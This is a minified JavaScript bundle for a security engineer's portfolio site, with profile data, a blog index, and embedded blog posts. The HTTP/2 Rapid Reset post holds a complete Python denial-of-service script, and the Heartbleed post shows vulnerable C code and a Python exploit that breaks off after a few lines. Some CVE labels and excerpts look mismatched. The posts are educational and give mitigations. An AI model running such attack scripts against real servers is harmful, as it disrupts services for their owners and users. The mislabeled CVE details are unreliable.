if((i=s)!=null&&i.v7_partialHydration&&n.length===0&&!t.initialized&&t.matches.length>0)e=t.matches;else return null}let a=e,l=(r=t)==null?void 0:r.errors;if(l!=null){let u=a.findIndex(h=>h.route.id&&(l==null?void 0:l[h.route.id])!==void 0);u>=0||ne(!1),a=a.slice(0,Math.min(a.length,u+1))}let o=!1,c=-1;if(t&&s&&s.v7_partialHydration)for(let u=0;u<a.length;u++){let h=a[u];if((h.route.HydrateFallback||h.route.hydrateFallbackElement)&&(c=u),h.route.id){let{loaderData:f,errors:v}=t,b=h.route.loader&&f[h.route.id]===void 0&&(!v||v[h.route.id]===void 0);if(h.route.lazy||b){o=!0,c>=0?a=a.slice(0,c+1):a=[a[0]];break}}}return a.reduceRight((u,h,f)=>{let v,b=!1,g=null,x=null;t&&(v=l&&h.route.id?l[h.route.id]:void 0,g=h.route.errorElement||lg,o&&(c<0&&f===0?(gg("route-fallback"),b=!0,x=null):c===f&&(b=!0,x=h.route.hydrateFallbackElement||null)));let p=n.concat(a.slice(0,f+1)),d=()=>{let m;return v?m=g:b?m=x:h.route.Component?m=E.createElement(h.route.Component,null):h.route.element?m=h.route.element:m=u,E.createElement(cg,{match:h,routeContext:{outlet:u,matches:p,isDataRoute:t!=null},children:m})};return t&&(h.route.ErrorBoundary||h.route.errorElement||f===0)?E.createElement(og,{location:t.location,revalidation:t.revalidation,component:g,error:v,children:d(),routeContext:{outlet:null,matches:p,isDataRoute:!0}}):d()},null)}var Sd=function(e){return e.UseBlocker="useBlocker",e.UseRevalidator="useRevalidator",e.UseNavigateStable="useNavigate",e}(Sd||{}),_d=function(e){return e.UseBlocker="useBlocker",e.UseLoaderData="useLoaderData",e.UseActionData="useActionData",e.UseRouteError="useRouteError",e.UseNavigation="useNavigation",e.UseRouteLoaderData="useRouteLoaderData",e.UseMatches="useMatches",e.UseRevalidator="useRevalidator",e.UseNavigateStable="useNavigate",e.UseRouteId="useRouteId",e}(_d||{});function pg(e){let n=E.useContext(io);return n||ne(!1),n}function dg(e){let n=E.useContext(eg);return n||ne(!1),n}function hg(e){let n=E.useContext(Wn);return n||ne(!1),n}function Ed(e){let n=hg(),t=n.matches[n.matches.length-1];return t.route.id||ne(!1),t.route.id}function fg(){var e;let n=E.useContext(wd),t=dg(),s=Ed();return n!==void 0?n:(e=t.errors)==null?void 0:e[s]}function mg(){let{router:e}=pg(Sd.UseNavigateStable),n=Ed(_d.UseNavigateStable),t=E.useRef(!1);return kd(()=>{t.current=!0}),E.useCallback(function(r,i){i===void 0&&(i={}),t.current&&(typeof r=="number"?e.navigate(r):e.navigate(r,Ms({fromRouteId:n},i)))},[e,n])}const Lc={};function gg(e,n,t){Lc[e]||(Lc[e]=!0)}function yg(e,n){e==null||e.v7_startTransition,e==null||e.v7_relativeSplatPath}function kn(e){ne(!1)}function vg(e){let{basename:n="/",children:t=null,location:s,navigationType:r=An.Pop,navigator:i,static:a=!1,future:l}=e;Ws()&&ne(!1);let o=n.replace(/^\/*/,"/"),c=E.useMemo(()=>({basename:o,navigator:i,static:a,future:Ms({v7_relativeSplatPath:!1},l)}),[o,l,i,a]);typeof s=="string"&&(s=Wt(s));let{pathname:u="/",search:h="",hash:f="",state:v=null,key:b="default"}=s,g=E.useMemo(()=>{let x=ro(u,o);return x==null?null:{location:{pathname:x,search:h,hash:f,state:v,key:b},navigationType:r}},[o,u,h,f,v,b,r]);return g==null?null:E.createElement(ct.Provider,{value:c},E.createElement(_i.Provider,{children:t,value:g}))}function wg(e){let{children:n,location:t}=e;return rg(Za(n),t)}new Promise(()=>{});function Za(e,n){n===void 0&&(n=[]);let t=[];return E.Children.forEach(e,(s,r)=>{if(!E.isValidElement(s))return;let i=[...n,r];if(s.type===E.Fragment){t.push.apply(t,Za(s.props.children,i));return}s.type!==kn&&ne(!1),!s.props.index||!s.props.children||ne(!1);let a={id:s.props.id||i.join("-"),caseSensitive:s.props.caseSensitive,element:s.props.element,Component:s.props.Component,index:s.props.index,path:s.props.path,loader:s.props.loader,action:s.props.action,errorElement:s.props.errorElement,ErrorBoundary:s.props.ErrorBoundary,hasErrorBoundary:s.props.ErrorBoundary!=null||s.props.errorElement!=null,shouldRevalidate:s.props.shouldRevalidate,handle:s.props.handle,lazy:s.props.lazy};s.props.children&&(a.children=Za(s.props.children,i)),t.push(a)}),t}/**
 * React Router DOM v6.30.2
 *
 * Copyright (c) Remix Software Inc.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE.md file in the root directory of this source tree.
 *
 * @license MIT
 */function Ja(){return Ja=Object.assign?Object.assign.bind():function(e){for(var n=1;n<arguments.length;n++){var t=arguments[n];for(var s in t)Object.prototype.hasOwnProperty.call(t,s)&&(e[s]=t[s])}return e},Ja.apply(this,arguments)}function kg(e,n){if(e==null)return{};var t={},s=Object.keys(e),r,i;for(i=0;i<s.length;i++)r=s[i],!(n.indexOf(r)>=0)&&(t[r]=e[r]);return t}function bg(e){return!!(e.metaKey||e.altKey||e.ctrlKey||e.shiftKey)}function xg(e,n){return e.button===0&&(!n||n==="_self")&&!bg(e)}const Sg=["onClick","relative","reloadDocument","replace","state","target","to","preventScrollReset","viewTransition"],_g="6";try{window.__reactRouterVersion=_g}catch{}const Eg="startTransition",Nc=fh[Eg];function Tg(e){let{basename:n,children:t,future:s,window:r}=e,i=E.useRef();i.current==null&&(i.current=Cm({window:r,v5Compat:!0}));let a=i.current,[l,o]=E.useState({action:a.action,location:a.location}),{v7_startTransition:c}=s||{},u=E.useCallback(h=>{c&&Nc?Nc(()=>o(h)):o(h)},[o,c]);return E.useLayoutEffect(()=>a.listen(u),[a,u]),E.useEffect(()=>yg(s),[s]),E.createElement(vg,{basename:n,children:t,location:l.location,navigationType:l.action,navigator:a,future:s})}const Cg=typeof window<"u"&&typeof window.document<"u"&&typeof window.document.createElement<"u",Pg=/^(?:[a-z][a-z0-9+.-]*:|\/\/)/i,St=E.forwardRef(function(n,t){let{onClick:s,relative:r,reloadDocument:i,replace:a,state:l,target:o,to:c,preventScrollReset:u,viewTransition:h}=n,f=kg(n,Sg),{basename:v}=E.useContext(ct),b,g=!1;if(typeof c=="string"&&Pg.test(c)&&(b=c,Cg))try{let m=new URL(window.location.href),w=c.startsWith("//")?new URL(m.protocol+c):new URL(c),S=ro(w.pathname,v);w.origin===m.origin&&S!=null?c=S+w.search+w.hash:g=!0}catch{}let x=ng(c,{relative:r}),p=Ag(c,{replace:a,state:l,target:o,preventScrollReset:u,relative:r,viewTransition:h});function d(m){s&&s(m),m.defaultPrevented||p(m)}return E.createElement("a",Ja({},f,{href:b||x,onClick:g||i?s:d,ref:t,target:o}))});var Rc;(function(e){e.UseScrollRestoration="useScrollRestoration",e.UseSubmit="useSubmit",e.UseSubmitFetcher="useSubmitFetcher",e.UseFetcher="useFetcher",e.useViewTransitionState="useViewTransitionState"})(Rc||(Rc={}));var Oc;(function(e){e.UseFetcher="useFetcher",e.UseFetchers="useFetchers",e.UseScrollRestoration="useScrollRestoration"})(Oc||(Oc={}));function Ag(e,n){let{target:t,replace:s,state:r,preventScrollReset:i,relative:a,viewTransition:l}=n===void 0?{}:n,o=bd(),c=$s(),u=xd(e,{relative:a});return E.useCallback(h=>{if(xg(h,t)){h.preventDefault();let f=s!==void 0?s:ni(c)===ni(u);o(e,{replace:f,state:r,preventScrollReset:i,relative:a,viewTransition:l})}},[c,o,u,s,r,t,e,i,a,l])}function Lg({onToggleTheme:e,theme:n}){const t=$s(),s=bd(),r=t.pathname==="/blogs",i=t.pathname.startsWith("/projects"),a=t.pathname.startsWith("/certifications"),l=t.pathname.startsWith("/cve-map"),o=t.hash==="#contact"||t.pathname==="/contact",c=(u,h)=>{u.preventDefault();const f=()=>{const v=document.getElementById(h);v&&v.scrollIntoView({behavior:"smooth",block:"start"})};t.pathname!=="/"?(s("/"),setTimeout(f,80)):f()};return y.jsx("nav",{className:"navbar",children:y.jsxs("div",{className:"container nav-container",children:[y.jsx("div",{className:"logo",children:"Hem Parekh | Security Engineer"}),y.jsxs("ul",{className:"nav-links",children:[y.jsx("li",{children:y.jsx("a",{href:"#about",onClick:u=>c(u,"about"),children:"About"})}),y.jsx("li",{children:y.jsx("a",{href:"#experience",onClick:u=>c(u,"experience"),children:"Experience"})}),y.jsx("li",{children:y.jsx(St,{to:"/projects",className:i?"active":"",children:"Projects"})}),y.jsx("li",{children:y.jsx(St,{to:"/certifications",className:a?"active":"",children:"Certs"})}),y.jsx("li",{children:y.jsx(St,{to:"/blogs",className:r?"active":"",children:"Blog"})}),y.jsx("li",{children:y.jsx(St,{to:"/cve-map",className:l?"active":"",children:"CVE Map"})}),y.jsx("li",{children:y.jsx("a",{href:"#contact",className:o?"active":"",onClick:u=>c(u,"contact"),children:"Contact"})})]}),y.jsxs("button",{className:"theme-toggle",id:"themeTheme",onClick:e,children:["Theme: ",n==="dark"?"Dark":"Light"]})]})})}function Ng(){return y.jsx("footer",{className:"footer",children:y.jsx("div",{className:"container",children:y.jsx("p",{children:"© 2024 Hem Parekh | All rights reserved."})})})}function Lt({title:e,id:n,children:t}){return y.jsxs("section",{className:"terminal-section",id:n,children:[y.jsx("div",{className:"terminal-header",children:`> ${e.toUpperCase()}`}),y.jsx("div",{className:"terminal-body",children:t}),y.jsx("div",{className:"terminal-divider",children:"------------------------------------------------------------"})]})}const Rg=[{href:"https://github.com/Hem1700",icon:"fab fa-github",label:"GitHub"},{href:"https://www.linkedin.com/in/hem-parekh/",icon:"fab fa-linkedin-in",label:"LinkedIn"},{href:"https://medium.com/@hemparekh1596",icon:"fab fa-medium",label:"Medium"},{href:"https://tryhackme.com/r/p/beatmonk",icon:"fas fa-terminal",label:"TryHackMe"},{href:"https://app.hackthebox.com/profile/overview",icon:"fas fa-user-secret",label:"HackTheBox"}],Mc={highlight:"Hem Parekh",blurb:"Security engineer and pen tester building hardened systems, staging exploit labs, and mapping attack surfaces before adversaries do."},Og={text:"I’m Hem Parekh, a Security Engineer and Pen Tester who thrives on building resilient software and unearthing vulnerabilities. I blend engineering discipline with a hacker’s curiosity to design secure systems and to stress-test the ones that already exist. When I’m not pulling threads on a bug, I’m writing up what I find so other defenders can move faster."},Mg=[{range:"Mar 2025 - Present",role:"Privacy Engineer",org:"Amazon",desc:"Driving privacy-by-design reviews and mitigating data exposure risks across services; partnering with engineering teams to embed controls and streamline compliance."},{range:"May 2024 - Dec 2024",role:"Cybersecurity Engineer Intern",org:"Toshiba Global Commerce Solution",desc:"Conducted penetration testing on over 25 web applications, identifying critical vulnerabilities, automating processes, and improving operational efficiency."},{range:"Jan 2023 - Aug 2023",role:"Research Assistant",org:"Rochester Institute of Technology",desc:"Applied knowledge of security standards, including NIST SP 800-53 and ISO/IEC 27001, conducting risk assessments and implementing controls to mitigate risks effectively."},{range:"Sep 2023 - May 2024",role:"Cybersecurity Analyst Intern",org:"Langan Engineering and Environmental Services",desc:"Conducted vulnerability assessments and penetration tests across 18 internal systems, contributing to enterprise security and developing NIST-27001-compliant documentation."},{range:"June 2021 - July 2022",role:"Security Operational Analyst (SOC)",org:"RNS Technology",desc:"Monitored 100+ security devices, responded to threat alerts, and conducted root cause analyses to enhance system security and data integrity."}],Ig=[{title:"Phish Analyzer Tool",description:"A patented desktop application designed to analyze and secure against phishing emails, featuring sandbox configurations, advanced security mechanisms, and a user-friendly interface to enhance threat detection and response.",href:"https://github.com/Hem1700/sita",tags:["Security","Desktop"]},{title:"Secure Communication Using Image Exif Data",description:"Explored the innovative use of image Exif data for covert communication. Developed methodologies for securely embedding and transmitting sensitive information through image metadata.",href:"https://drive.google.com/file/d/1WcmhCJQN_b8jad3dQoGplBmO6EN1leYZ/view?usp=sharing",tags:["Research","Security"]},{title:"Architecture and Advancement in Virtualization of TPM",description:"Explored the architecture and advancements of virtual Trusted Platform Modules (vTPMs) in virtual and cloud environments. The project highlighted security flaws, key-sharing mechanisms, and the migration challenges associated with vTPMs, proposing solutions for enhanced security and trust in virtualization.",href:"https://drive.google.com/file/d/1Y2vyRjVBgjy6QB9_qn_taJUrYCodehHT/view?usp=sharing",tags:["Research","Cloud"]},{title:"Quantum Key Distribution",description:"This project delves into the rapidly evolving field of quantum cryptography, focusing on Quantum Key Distribution (QKD). It explores innovative methods to increase QKD transmission distance while maintaining secure data transmission, addressing challenges such as key generation rates, distance limitations, and potential vulnerabilities.",href:"https://drive.google.com/file/d/17vZRyJyKYX7CmUgC1iBQf4buEsBgoC30/view?usp=sharing",tags:["Research","Cryptography"]},{title:"SecTool: The Comprehensive Cybersecurity Toolkit",description:"SecTool is a versatile cybersecurity toolkit with features like keylogging, OSINT, payload generation, hash cracking, network analysis, social engineering tools, web vulnerability detection, and more. It’s a comprehensive solution for security testing and digital defense.",href:"https://github.com/Hem1700/sectool",tags:["Security","Toolkit"]},{title:"Website Crawler",description:"A lightweight and efficient web crawler designed to scrape, analyze, and extract data from websites, enabling seamless data collection for various use cases.",href:"https://github.com/Hem1700/Website-crawler",tags:["Web","Automation"]}],zg=[{title:"CompTIA Security+",details:"Issued Oct 2024 by CompTIA - Expires Oct 2027",href:"https://www.credly.com/badges/7270d02f-a0d1-483a-8000-8ebd2b628391/linked_in_profile",domain:"Security",issuer:"CompTIA"},{title:"CompTIA Pentest+",details:"Issued Oct 2024 by CompTIA - Expires Oct 2027",href:"https://www.credly.com/badges/d93ed2a7-c86b-42ec-b4e4-7a7d2a2cd972/linked_in_profile",domain:"Security",issuer:"CompTIA"},{title:"CompTIA CySA+",details:"Issued Nov 2024 by CompTIA - Expires Nov 2027",href:"https://www.credly.com/badges/d6a9802e-23b8-4a0a-83e1-edc7e89a457c/linked_in_profile",domain:"Security",issuer:"CompTIA"},{title:"CompTIA Network Vulnerability Assessment Professional (CVNP)",details:"Issued Oct 2024 by CompTIA - Expires Oct 2027",href:"https://www.credly.com/badges/59404c7e-7680-45a9-8622-2a76f603c0c7/linked_in_profile",domain:"Security",issuer:"CompTIA"},{title:"CompTIA Security Analytics Professional (CSAP)",details:"Issued Nov 2024 by CompTIA - Expires Nov 2027",href:"https://www.credly.com/badges/8c6cca3e-0eb1-4920-8eff-826998743336/linked_in_profile",domain:"Security",issuer:"CompTIA"},{title:"CompTIA Network Security Professional (CNSP)",details:"Issued Nov 2024 by CompTIA - Expires Nov 2027",href:"https://www.credly.com/badges/08f2dd46-295b-402c-bc67-29189bea83ff/linked_in_profile",domain:"Security",issuer:"CompTIA"},{title:"ICS2 Certified in Cybersecurity (CC)",details:"Issued Oct 2024 - Expires Oct 2027",href:"https://www.credly.com/badges/c16c4d43-1e84-44ab-bebe-38d747073ccb/linked_in_profile",domain:"Security",issuer:"ISC2"},{title:"AWS Certified Cloud Practitioner (CCP)",details:"Issued Mar 2024 - Expires Mar 2027",href:"https://www.credly.com/badges/6a0d691b-b3b2-4d44-addb-f2b5b171e83d/linked_in_profile",domain:"Cloud",issuer:"AWS"},{title:"Microsoft Azure Security, Compliance and Identity Fundamentals (SC-900)",details:"Issued Sep 2024 by Microsoft - No expiration",href:"https://learn.microsoft.com/api/credentials/share/en-us/HemParekh-9873/BD2B5E59D28A7F54?sharingId=1D33B191273E7834",domain:"Cloud",issuer:"Microsoft"},{title:"Microsoft Azure Fundamentals (AZ-900)",details:"Issued Sep 2024 by Microsoft - No expiration",href:"https://learn.microsoft.com/api/credentials/share/en-gb/HemParekh-9873/8B3B97F4E45B9F2C?sharingId",domain:"Cloud",issuer:"Microsoft"},{title:"CCNA: Introduction to Networks",details:"Issued Jun 2020 by Cicso - No expiration",href:"https://www.credly.com/badges/be753401-bd44-4d09-81d7-33af049e6fad/linked_in_profile",domain:"Networking",issuer:"Cisco"},{title:"Cisco: Endpoint Security",details:"Issued Nov 2024 by Cicso - No expiration",href:"https://www.credly.com/badges/9e4309a6-089f-4259-8333-c9c501666c77/linked_in_profile",domain:"Security",issuer:"Cisco"}],ao=[{slug:"kernel_surface_audit_blog",title:"Who Can Touch Your Kernel? Auditing /boot/vmlinuz-* on Linux",href:"/blog/kernel_surface_audit_blog",excerpt:"A defender’s walkthrough on who should vs. who can modify your kernel image, dangerous root patterns, and a Python-based audit checklist to watch /boot/vmlinuz-*.",date:"December 8, 2025",readTime:"7 min read"},{slug:"cve-2022-26318-re-blog",title:"Reverse-Engineering CVE-2022-26318 (WatchGuard Firebox/XTM): From Network Trace to Root Cause (Non-Weaponized)",href:"/blog/cve-2022-26318-re-blog",excerpt:"Defender-focused RE of CVE-2022-26318: how the /agent/login path reaches wgagent, SAX parsing overflow mechanics, watchpoint-driven proof, and patch/detection guidance without weaponized details.",date:"December 28, 2025",readTime:"10 min read"},{slug:"react2shell-toy-lab",title:'From React2Shell to Toy Labs: Understanding Insecure Deserialization with a Tiny "Fake Flight" Server',href:"/blog/react2shell-toy-lab",excerpt:'Build a tiny "fake Flight" Node lab to see how insecure deserialization and thenable handling can lead to RCE, plus a safer variant and takeaways that mirror React2Shell.',date:"December 8, 2025",readTime:"8 min read"},{slug:"transient_scheduler_attacks_tsa_blog",title:"Transient Scheduler Attacks on CPUs: Exploiting AMD’s New Microarchitectural Leak",href:"/blog/transient_scheduler_attacks_tsa_blog",excerpt:"AMD’s new TSA class abuses false completions in the instruction scheduler to leak data across privilege boundaries. Here’s what TSA is, how an attacker could exploit it, a tiny timing lab to feel the leak, and what defenders should do.",date:"December 4, 2025",readTime:"8 min read"},{slug:"firmware_llm_annotator",title:"Firmware Exploration: LLM as Your Annotator",href:"/blog/firmware_llm_annotator",excerpt:"How to use an LLM as a helper for firmware reversing: triaging strings, summarizing decompiled functions, and annotating config blobs while you stay in control of the analysis.",date:"November 30, 2025",readTime:"5 min read"},{slug:"1001",title:"CVE-2024–1001",href:"/blog/1001",excerpt:"Kubernetes relies heavily on Role-Based Access Control (RBAC) to manage permissions. However, in early 2024, CVE-2024–1001 was disclosed, revealing how misconfigured RBAC rules in Kubernetes could allow attackers to gain full control over a cluster. This vulnerability emphasizes the risks of poorly defined access policies.",date:"September 8, 2024",readTime:"3 min read"},{slug:"0012",title:"CVE-2024–0012",href:"/blog/0012",excerpt:"CVE-2024–0012, known as the HTTP/2 Rapid Reset Attack, was disclosed, affecting major web servers like Apache and Nginx. This denial-of-service (DoS) vulnerability exploits HTTP/2’s stream management system by abusing the RST_STREAM frame. By overwhelming the server with rapid stream resets, attackers can exhaust resources and disrupt services.",date:"September 8, 2024",readTime:"3 min read"},{slug:"40982",title:"CVE-2022–40982",href:"/blog/40982",excerpt:"A critical vulnerability, CVE-2022–40982, dubbed Downfall, was disclosed. This vulnerability affects Intel x86–64 processors and exploits speculative execution to access sensitive data stored in vector registers. It impacts both consumer CPUs and server-grade Xeon processors, allowing attackers with local access to bypass security boundaries and potentially extract confidential information like encryption keys or passwords.",date:"September 8, 2024",readTime:"3 min read"},{slug:"cow",title:"CVE-2016–5195",href:"/blog/cow",excerpt:"In 2016, a critical vulnerability in the Linux kernel, known as Dirty Cow (CVE-2016–5195), was disclosed. This privilege escalation flaw exploited a race condition in the kernel’s memory management system, allowing attackers to write to read-only memory mappings. The name “Dirty Cow” comes from its exploitation of the Copy-On-Write (COW) mechanism in Linux.",date:"September 8, 2024",readTime:"3 min read"},{slug:"symlinks",title:"Symbolic Links (Symlinks) in Linux",href:"/blog/symlinks",excerpt:"TIn Linux, symbolic links are essentially shortcuts that point to other files or directories. They allow you to reference a file or directory without duplicating its contents. To know more read the blog.",date:"September 8, 2024",readTime:"3 min read"},{slug:"23397",title:"CVE-2023–23397",href:"/blog/23397",excerpt:"This blog will break down the ROBOT attack, provide examples, and discuss mitigations to protect vulnerable systems.",date:"September 8, 2024",readTime:"3 min read"},{slug:"0160",title:"CVE-2014-0160",href:"/blog/0160",excerpt:"Heartbleed’s simplicity and devastating impact exposed the internet’s underlying fragility, and despite extensive efforts to patch affected systems, its ghost still haunts forgotten and neglected systems today. Let’s explore the technical details of this vulnerability, the global chaos it caused, and why it’s still relevant.",date:"September 8, 2024",readTime:"3 min read"},{slug:"11882",title:"CVE-2017-11882",href:"/blog/11882",excerpt:"One of the most notorious among these is CVE-2017–11882, commonly known as the Microsoft Office Memory Corruption Vulnerability. Originating in 2000, this vulnerability remains a frequently exploited entry point for attackers worldwide, from nation-state actors to cyber criminals.",date:"October 26 2024",readTime:"3 min read"},{slug:"robot",title:"ROBOT (Return of Bleichenbacher’s Oracle Threat) Attack",href:"/blog/robot",excerpt:"This blog will break down the ROBOT attack, provide examples, and discuss mitigations to protect vulnerable systems.",date:"September 8, 2024",readTime:"3 min read"},{slug:"poodle",title:"ZOMBIE POODLE and GOLDENDOODLE ATTACKS",href:"/blog/poodle",excerpt:"This blog provides an in-depth look at Zombie Poodle and Goldendoodle attacks, how they work, and their implications for modern cybersecurity.",date:"September 6, 2024",readTime:"6 min read"}];function Ic(){return y.jsxs("div",{className:"terminal-feed",children:[y.jsx(Lt,{title:"home",children:y.jsx("pre",{className:"terminal-block",children:`user: ${Mc.highlight}
roles: Security Engineer | Pen Tester | Threat Hunter
bio: ${Mc.blurb}`})}),y.jsx(Lt,{title:"experience",id:"experience",children:y.jsx("ul",{className:"terminal-list",children:Mg.map(e=>y.jsxs("li",{children:[e.role," @ ",e.org," [",e.range,"]"]},`${e.role}-${e.range}`))})}),y.jsxs(Lt,{title:"about",id:"about",children:[y.jsx("p",{className:"terminal-text",children:Og.text}),y.jsx("div",{className:"terminal-list inline",children:Rg.map(e=>y.jsx("a",{href:e.href,target:"_blank",rel:"noreferrer",children:e.label},e.href))})]})]})}function Dg(){return y.jsx("div",{className:"terminal-feed",children:y.jsx(Lt,{title:"blogs",children:y.jsx("ul",{className:"terminal-list",children:ao.map(e=>y.jsxs("li",{children:[y.jsx(St,{to:`/blog/${e.slug}`,children:e.title})," — ",e.excerpt]},e.slug))})})})}const jg=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>CVE-2024–0012: HTTP/2 Rapid Reset Attack Explained</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">CVE-2024–0012: HTTP/2 Rapid Reset Attack Explained</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>What is CVE-2024–0012?</h2>
        <p>
          CVE-2024–0012, known as the HTTP/2 Rapid Reset Attack, was disclosed, affecting major web servers like Apache and Nginx. This denial-of-service (DoS) vulnerability exploits HTTP/2’s stream management system by abusing the RST_STREAM frame. By overwhelming the server with rapid stream resets, attackers can exhaust resources and disrupt services.
        </p>

        <h2>How the Vulnerability Works</h2>
        <h3>HTTP/2 and RST_STREAM</h3>
        <p>
          HTTP/2 allows multiplexing multiple streams over a single connection. The RST_STREAM frame cancels streams when they are no longer needed. However, attackers can send a rapid series of RST_STREAM frames, forcing the server to process and discard streams at an unsustainable rate, leading to resource exhaustion.
        </p>

        <h2>Exploit Code Example</h2>
        <p>
          Below is an educational example in Python that demonstrates how an attacker could exploit this vulnerability using an HTTP/2 library.
        </p>
        <div class="code-block">
          <code>
import h2.connection<br>
import h2.events<br>
import socket<br>
import ssl<br>
import time<br><br>

# Configure target server<br>
TARGET_HOST = "vulnerable-server.com"<br>
TARGET_PORT = 443<br>
STREAM_COUNT = 1000  # Number of streams to abuse<br><br>

def send_reset_attack():<br>
    # Establish SSL/TLS connection<br>
    context = ssl.create_default_context()<br>
    with socket.create_connection((TARGET_HOST, TARGET_PORT)) as raw_sock:<br>
        with context.wrap_socket(raw_sock, server_hostname=TARGET_HOST) as tls_sock:<br>
            # Initialize HTTP/2 connection<br>
            conn = h2.connection.H2Connection()<br>
            conn.initiate_connection()<br>
            tls_sock.sendall(conn.data_to_send())<br><br>

            # Send multiple streams with rapid resets<br>
            for stream_id in range(1, STREAM_COUNT * 2, 2):  # HTTP/2 streams are odd-numbered<br>
                conn.send_headers(<br>
                    stream_id=stream_id,<br>
                    headers=[<br>
                        (":method", "GET"),<br>
                        (":path", "/"),<br>
                        (":authority", TARGET_HOST),<br>
                        (":scheme", "https"),<br>
                    ],<br>
                )<br>
                tls_sock.sendall(conn.data_to_send())<br>
                conn.reset_stream(stream_id)<br>
                tls_sock.sendall(conn.data_to_send())<br>
                print(f"Stream {stream_id} reset sent")<br>
            time.sleep(5)<br><br>

if __name__ == "__main__":<br>
    print(f"Launching HTTP/2 Rapid Reset Attack on {TARGET_HOST}...")<br>
    send_reset_attack()<br>
    print("Attack complete. Check server performance.")<br>
          </code>
        </div>
        <p><strong>Disclaimer:</strong> This code is for educational purposes only. Testing such exploits without proper authorization is unethical and illegal.</p>

        <h2>Mitigation Strategies</h2>
        <ol>
          <li><strong>Apply Server Patches:</strong> Server vendors like Apache and Nginx have released patches to mitigate this vulnerability. Update your software to the latest version.</li>
          <li><strong>Implement Rate-Limiting:</strong> Use rate-limiting to restrict the number of HTTP/2 streams and resets per connection.</li>
          <li><strong>Monitor Server Metrics:</strong> Deploy monitoring tools to detect unusual spikes in resource usage associated with HTTP/2 traffic.</li>
          <li><strong>Disable HTTP/2 Temporarily:</strong> If patching is not feasible, disable HTTP/2 support as a temporary mitigation:
            <ul>
              <li><strong>For Apache:</strong> Remove <code>h2</code> from the <code>Protocols</code> directive:</li>
              <code>Protocols h2 h2c http/1.1</code>
              <li><strong>For Nginx:</strong> Remove the <code>http2</code> directive from server configurations.</li>
            </ul>
          </li>
        </ol>

        <h2>Conclusion</h2>
        <p>
          CVE-2024–0012, or the HTTP/2 Rapid Reset Attack, underscores the importance of securing web servers against denial-of-service attacks. By applying timely patches, implementing rate-limiting, and monitoring server activity, organizations can mitigate this threat and ensure the availability of their services.
        </p>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,Bg=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Heartbleed (CVE-2014–0160)</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">Heartbleed (CVE-2014–0160)</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>Understanding Heartbleed: A Technical Breakdown</h2>
        <p>
          Heartbleed was a flaw in the heartbeat extension of OpenSSL, a widely used library that provides SSL/TLS encryption. The vulnerability was introduced in OpenSSL version 1.0.1 and persisted until version 1.0.1g. The issue stemmed from improper input validation, allowing an attacker to read arbitrary chunks of server memory, up to 64KB per request.
        </p>

        <h3>Heartbeat Extension Basics</h3>
        <p>
          To maintain secure connections, OpenSSL’s heartbeat mechanism allows clients and servers to verify each other’s presence by sending and receiving “heartbeat” messages. Here’s how the message exchange is supposed to work:
        </p>
        <ol>
          <li>A client sends a heartbeat request containing a payload and specifies the payload length.</li>
          <li>The server echoes the payload back to the client to confirm the connection is still alive.</li>
        </ol>
        <p>
          The vulnerability occurs because the server trusts the client-supplied payload length without verifying it against the actual payload size, leading to memory leaks.
        </p>

        <h3>Simplified Vulnerable Code</h3>
        <div class="code-block">
          <code>
int tls1_process_heartbeat(SSL *s) {<br />
&nbsp;&nbsp;unsigned char *p = &s->s3->rrec.data[0];<br />
&nbsp;&nbsp;unsigned short payload;<br />
&nbsp;&nbsp;unsigned char *buffer, *bp;<br />
&nbsp;&nbsp;payload = (p[0] << 8) | p[1];<br />
&nbsp;&nbsp;buffer = OPENSSL_malloc(1 + 2 + payload + 16);<br />
&nbsp;&nbsp;bp = buffer;<br />
&nbsp;&nbsp;*bp++ = TLS1_HB_RESPONSE;<br />
&nbsp;&nbsp;memcpy(bp, p, payload); // Vulnerable<br />
&nbsp;&nbsp;ssl3_write_bytes(s, TLS1_RT_HEARTBEAT, buffer, 3 + payload);<br />
&nbsp;&nbsp;OPENSSL_free(buffer);<br />
}
          </code>
        </div>

        <h2>How Heartbleed Works</h2>
        <p>
          An attacker can exploit this vulnerability by sending a malicious heartbeat request where the payload length is intentionally larger than the actual payload.
        </p>

        <h3>Exploit Example in Python</h3>
        <div class="code-block">
          <code>
import socket<br />
import struct<br />
def create_heartbeat_request():<br />
&nbsp;&nbsp;hb_type = 1<br />
